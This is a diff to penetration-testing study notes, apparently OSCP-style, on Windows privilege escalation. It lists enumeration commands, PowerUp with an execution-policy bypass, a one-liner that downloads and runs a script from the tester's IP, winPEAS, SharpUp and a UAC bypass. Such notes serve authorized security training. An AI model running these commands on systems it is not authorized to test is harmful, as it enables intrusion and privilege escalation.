@@ -31,15 +31,16 @@
  # Privilege Escalation for Window
  reference: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
  0. `whoami` `systeminfo` `whoami /priv` `whoami /groups` Conduct basic enumeration, and look for interesting files in the directory\ 
- 1. Transfer the file to Window to TMP directory using any of the above methods.
- 2. Use PowerUp. `powershell -ep bypass`
- 3. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
- 4. `Invoke-AllChecks`
- 5. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
- 6. Use WinPeas
- 7. `winpeas.exe`
- 8. Use SharUp if you cant run winpeas or powerup 
- 9. `.\SharpUp.exe`
+ 1. `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` basic system Info
+ 2. Transfer the file to Window to TMP directory using any of the above methods.
+ 3. Use PowerUp. `powershell -ep bypass`
+ 4. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
+ 5. `Invoke-AllChecks`
+ 6. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
+ 7. Use WinPeas
+ 8. `winpeas.exe`
+ 9. Use SharUp if you cant run winpeas or powerup 
+ 10. `.\SharpUp.exe`
  ## UAC Bypass
  1. `powershell.exe Start-Process cmd.exe -Verb runAs` run cmd as high integrity,(this is the case when we have admin access to folder but cant execute admin, run as admin )
  2. https://github.com/CsEnox/EventViewer-UACBypass
